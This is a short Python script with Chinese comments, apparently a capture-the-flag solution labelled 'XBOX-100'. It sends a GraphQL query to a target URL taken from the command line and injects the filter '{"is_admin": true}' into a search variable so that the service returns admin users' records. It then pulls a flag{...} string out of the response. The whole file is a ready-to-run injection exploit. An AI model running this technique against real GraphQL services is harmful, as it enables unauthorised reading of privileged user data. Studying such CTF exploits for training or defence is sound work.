# coding:utf-8
import requests
import re
import sys

"""
@文件命名：XBOX-100
@使用方式: python 100.py http://目标地址:端口/graphql
@简述思路: 利用 GraphQL 查询注入，获取管理员用户的 flag 字段
"""


def Scan(url):
    flag = ""
    try:
        query = """
        query getFlag($search: String) {
          users(search: $search) {
            username
            email
            flag
          }
        }
        """
        variables = {"search": '{"is_admin": true}'}
        resp = requests.post(
            url, json={"query": query, "variables": variables}, timeout=10
        )
        data = resp.json()
        # 提取所有 flag 字段
        users = data.get("data", {}).get("users", [])
        for user in users:
            f = user.get("flag", "")
            if f:
                match = re.search(r"(flag|FLAG)\{.*?\}", f)
                if match:
                    flag = match.group(0)
                    break
    except Exception as e:
        print(e)
    return flag


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python exp.py http://目标地址:端口/graphql")
    else:
        print(Scan(url=sys.argv[1]))
